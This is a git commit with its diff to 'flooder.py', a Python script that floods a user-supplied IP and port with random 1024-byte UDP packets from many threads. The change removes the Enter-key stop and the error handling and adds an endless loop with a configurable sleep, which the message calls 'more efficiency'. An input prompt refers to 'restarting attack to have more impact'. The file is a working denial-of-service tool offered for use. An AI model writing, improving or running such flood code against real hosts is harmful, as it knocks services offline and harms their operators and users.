61187c53546a976f50293ff484370be7b8c76191
Marcel Dan <gigi.dan2011@gmail.com>
2020-02-18 19:50:29 +0100

    updated code to provide way more efficiency

--- flooder.py
+++ flooder.py
@@ -2,42 +2,27 @@ import random
 import socket
 import threading
 import keyboard
+import time
 
 ip = str(input(" IP: "))
 port = int(input(" PORT: "))
 times = int(input(" PACKETS PER THREAD: "))
 threads = int(input(" THREADS: "))
 loopOfLoop = int(input(" LOOPS OF LOOPS (restarting attack to have more impact): "))
+sleepTime  = float(input(" SLEEP TIME BETWEEN LOOPS: "))
 def main():
 	for y in range(threads):
-		th = threading.Thread(target=go2)
+		th = threading.Thread(target=go)
 		th.start()
 def go():
-	sum = 0
 	loop = 0
 	data = random._urandom(1024)
-	while loop<loopOfLoop:
-		loop+=loop+1
-		try:
-			if keyboard.is_pressed('\r'):
-				try:
-					break
-				except:
-					print(" 'Enter' detected, stopping...")
+	while 1:
+		time.sleep(sleepTime)
+		while loop<loopOfLoop:
+			loop+=1
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				sum+= 1
-			print(sum, " Sending ")
-		except:
-			print(" Not Sending ")
-def go2():
-	while 1:
-		if keyboard.is_pressed('\r'):
-			try:
-				break
-			except:
-				print(" 'Enter' detected, stopping...")
-		go()
 main()
